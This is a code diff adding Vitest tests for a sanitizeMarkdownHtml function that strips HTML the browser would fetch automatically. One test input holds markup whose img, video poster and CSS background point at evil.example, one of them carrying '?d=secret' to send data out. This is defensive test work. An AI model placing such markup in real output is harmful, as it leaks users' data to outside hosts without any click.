@@ -1,6 +1,12 @@
 import { describe, expect, it } from 'vitest'
 
-import { isSafeFrameUrl, safeHref, sanitizeHtml, sanitizeSvgBody } from '~/lib/sanitize'
+import {
+  isSafeFrameUrl,
+  safeHref,
+  sanitizeHtml,
+  sanitizeMarkdownHtml,
+  sanitizeSvgBody,
+} from '~/lib/sanitize'
 
 describe('sanitizeHtml', () => {
   it('keeps ordinary markup', () => {
@@ -31,6 +37,23 @@ describe('sanitizeHtml', () => {
     for (const tag of ['form', 'input', 'textarea', 'select', 'button']) {
       expect(html).not.toContain(`<${tag}`)
     }
+  })
+})
+
+describe('sanitizeMarkdownHtml', () => {
+  it('removes what the browser would fetch without a click', () => {
+    const html = sanitizeMarkdownHtml(
+      '<p style="background:url(https://evil.example/c)">Summary</p>' +
+        '<img src="https://evil.example/c?d=secret"><video poster="https://evil.example/p"></video>'
+    )
+
+    expect(html).toBe('<p>Summary</p>')
+  })
+
+  it('keeps links', () => {
+    expect(sanitizeMarkdownHtml('<a href="https://example.com">docs</a>')).toContain(
+      'href="https://example.com"'
+    )
   })
 })
 
